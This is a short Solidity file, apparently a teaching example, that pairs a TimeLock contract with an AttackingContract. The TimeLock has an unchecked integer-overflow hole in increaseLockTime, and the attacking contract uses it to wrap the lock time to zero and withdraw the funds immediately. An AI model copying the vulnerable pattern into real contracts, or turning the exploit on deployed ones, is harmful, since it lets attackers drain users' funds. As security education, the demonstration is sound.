pragma solidity ^0.6.6;

// Here we are using uint overflow to bypass the lock time
// of funds deposited on a contract.

// eth deposited on this contract are locked for a period of time
contract TimeLock {
    // amount of eth deposited by the user
    mapping(address => uint) public balances;

    // time at which the user can withdraw his funds
    mapping(address => uint) public lockTime;

    // deposit eth and lock the funds for 1 week
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    // increase the lock time by x seconds
    function increaseLockTime(uint _secondToIncrease) public {
        lockTime[msg.sender] += _secondToIncrease;
    }

    // withdraw all the funds deposited if the lock time has expired
    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Failed to send eth");
    }
}

contract AttackingContract {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = _timeLock;
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        // t == current lock time
        // find x such that 
        // x + t = 2**256
        // x = 2**256 - t
        timeLock.increaseLockTime(
            uint(-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
    }
}